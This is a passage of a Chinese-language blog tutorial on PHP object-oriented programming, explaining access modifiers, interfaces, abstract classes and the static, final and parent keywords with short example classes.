class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210709203833032.png" alt="image-20210709203833032"></p><h3 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h3><p>PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。</p><ul><li>public（公有）：公有的类成员可以在任何地方被访问。</li><li>protected受保护）：受保护的类成员则可以被其自身以及其子类和父类访问。</li><li>private（私有）：私有的类成员则只能被其定义所在的类访问。</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">age</span><span class="token operator">=</span><span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"名字是 <span class="token interpolation"><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span></span> 年龄是 <span class="token interpolation"><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">age</span></span> 岁"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$p1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'晓莎K'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'18'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$p1</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$p1</span><span class="token operator">-&gt;</span><span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*class P1 extends Person{    //重写getuser    function getUser()    {        return "名字是 $this-&gt;name";    }    function run(){        return " $this-&gt;name 在跑步";    }}$p2 = new P1('KK','20');echo $p2-&gt;getUser();echo $p2-&gt;run();*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210709204343023.png" alt="image-20210709204343023"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">"public 共有的"</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$b</span><span class="token operator">=</span><span class="token string double-quoted-string">"protected 受保护的"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$c</span><span class="token operator">=</span><span class="token string double-quoted-string">"private 私有的"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">print1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">//在类中的函数可以访问   三种属性</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">b</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">c</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">a1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"public"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">a2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">a3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">a2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"protected"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">a3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"privite"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$p1</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$p1-&gt;print1();</span><span class="token comment">//在类外只能访问到public，protected和private不能被访问到</span><span class="token keyword">echo</span> <span class="token variable">$p1</span><span class="token operator">-&gt;</span><span class="token function">a1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210709204416327.png" alt="image-20210709204416327"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Person</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"名字是 <span class="token interpolation"><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span></span> 年龄是 <span class="token interpolation"><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">age</span></span> 岁"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">P1</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">a1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">.</span><span class="token string single-quoted-string">'访问受保护的'</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$p2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">P1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'KK'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'20'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$p2</span><span class="token operator">-&gt;</span><span class="token function">a1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210709204452805.png" alt="image-20210709204452805"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Person</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"名字是 <span class="token interpolation"><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span></span> 年龄是 <span class="token interpolation"><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">age</span></span> 岁"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">P1</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">a1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">.</span><span class="token string single-quoted-string">'私有的'</span><span class="token punctuation">;</span><span class="token comment">//私有只能在被其所定义的类内访问</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//私有只能在被其所定义的类内访问</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$p2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">P1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'KK'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'20'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$p2</span><span class="token operator">-&gt;</span><span class="token function">a1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210709204620033.png" alt="image-20210709204620033"></p><h2 id="接口和抽象类"><a href="#接口和抽象类" class="headerlink" title="接口和抽象类"></a>接口和抽象类</h2><h3 id="接口："><a href="#接口：" class="headerlink" title="接口："></a>接口：</h3><ul><li>对接口的使用是通过关键字implements，声明接口用interface</li><li>接口不能定义成员变量（包括类静态变量），能定义常量</li><li>子类必须实现接口定义的所有方法</li><li>接口只能定义不能实现该方法</li><li>接口没有构造函数</li><li>接口中的方法和实现它的类默认都是public类型的</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">interface</span> <span class="token class-name-definition class-name">Person</span><span class="token punctuation">{</span>    <span class="token comment">//用interface声明一个接口</span>    <span class="token comment">//接口中  所有的方法都是公共有的 方法可以允许有参数</span>    <span class="token comment">//接口中  可以使用常量  但是不能使用变量</span>    <span class="token keyword">const</span> <span class="token constant">NAME</span><span class="token operator">=</span><span class="token string double-quoted-string">"这是一个常量"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span>  <span class="token function-definition function">setName</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">interface</span> <span class="token class-name-definition class-name">P</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//类可以有多个接口</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">P1</span> <span class="token keyword">implements</span> <span class="token class-name">Person</span><span class="token punctuation">,</span><span class="token constant">P</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setName</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"setName"</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"getName"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"run"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">P1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'晓莎K'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210710130537683.png" alt="image-20210710130537683"></p><h3 id="抽象类："><a href="#抽象类：" class="headerlink" title="抽象类："></a>抽象类：</h3><ul><li>对抽象类的使用是通过关键字extends</li><li>不能被实例化，可以定义子类必须实现的方法</li><li>子类必须定义父类中的所有抽象方法，这些方法的访问控制必须和父类中一样（或者更为宽松）</li><li>如一个类中有一个抽象方法，则该类必须定义为抽象类</li><li>抽象类可以有构造函数</li><li>抽象类中的方法可以使用private,protected,public来修饰。</li><li>一个类可以同时实现多个接口，但一个类只能继承于一个抽象类。</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//声明抽象类abstract</span><span class="token comment">//抽象类里面允许有   抽象方法和方法   抽象方法不能有具体的内容  必须为空 允许有参数</span><span class="token comment">//抽象类不能实例化  抽象类不能new对象出来</span><span class="token comment">//子类中必须实现每一个抽象方法</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">people</span><span class="token punctuation">{</span>    <span class="token keyword">abstract</span> <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">abstract</span> <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">setName</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"run"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">//类只能继承一个抽象类</span><span class="token comment">//必须把抽象类里面的方法  实现</span><span class="token comment">//如果抽象类是protected  子类定义方法的时候  可以是  protected  public  不能使 public</span><span class="token keyword">class</span>  <span class="token class-name-definition class-name">P1</span> <span class="token keyword">extends</span> <span class="token class-name">people</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"getName"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setName</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"setName"</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// TODO: Change the autogenerated stub</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">P1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'晓莎K'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'KKKK'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210710130717322.png" alt="image-20210710130717322"></p><h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><h3 id="static关键字"><a href="#static关键字" class="headerlink" title="static关键字"></a>static关键字</h3><ul><li>声明类属性或方法为 static(静态)，就可以不实例化类而直接访问。</li><li>静态属性不能通过一个类已实例化的对象来访问（但静态方法可以）。</li><li>由于静态方法不需要通过对象即可调用，所以伪变量 $this 在静态方法中不可用。</li><li>静态属性不可以由对象通过 -&gt; 操作符来访问。</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//静态方法 静态变量</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span>  <span class="token keyword">static</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string double-quoted-string">"晓莎K"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">getString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"getString"</span><span class="token operator">.</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token comment">//return "getString".$this-&gt;name=$name; 不能使用this</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">//不需要实例化(不需要new对象)  直接进行访问</span><span class="token keyword">echo</span> <span class="token class-name static-context">Person</span><span class="token operator">::</span><span class="token variable">$name</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token class-name static-context">Person</span><span class="token operator">::</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210710130854771.png" alt="image-20210710130854771"></p><h3 id="final关键字"><a href="#final关键字" class="headerlink" title="final关键字"></a>final关键字</h3><p>如果父类中的方法被声明为 final，则子类无法覆盖该方法。</p><p>如果一个类被声明为 final，则不能被继承。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//final 子类不能重写父类有此关键字的函数</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span>   <span class="token variable">$name</span><span class="token operator">=</span><span class="token string double-quoted-string">"晓莎K"</span><span class="token punctuation">;</span>    <span class="token keyword">final</span> <span class="token keyword">public</span>  <span class="token keyword">function</span> <span class="token function-definition function">getString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"这个是父类的方法"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">c1</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"这个是字类的方法"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210710131010967.png" alt="image-20210710131010967"></p><h3 id="parent关键字"><a href="#parent关键字" class="headerlink" title="parent关键字"></a>parent关键字</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type:text/html;charset=UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$userName</span><span class="token operator">=</span><span class="token string single-quoted-string">'我是老爸'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string single-quoted-string">'58'</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'老爸,需要有人陪着打麻将！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Student</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$userName</span><span class="token operator">=</span><span class="token string single-quoted-string">'我是学生'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string single-quoted-string">'16'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'学生不能打麻将！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$xiaoming</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xiaoming</span><span class="token operator">-&gt;</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//老爸,需要有人陪着打麻将！学生不能打麻将！</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210710131400359.png" alt="image-20210710131400359"></p><h2 id="php超级全局变量"><a href="#php超级全局变量" class="headerlink" title="php超级全局变量"></a>php超级全局变量</h2><ul><li>$GLOBALS　　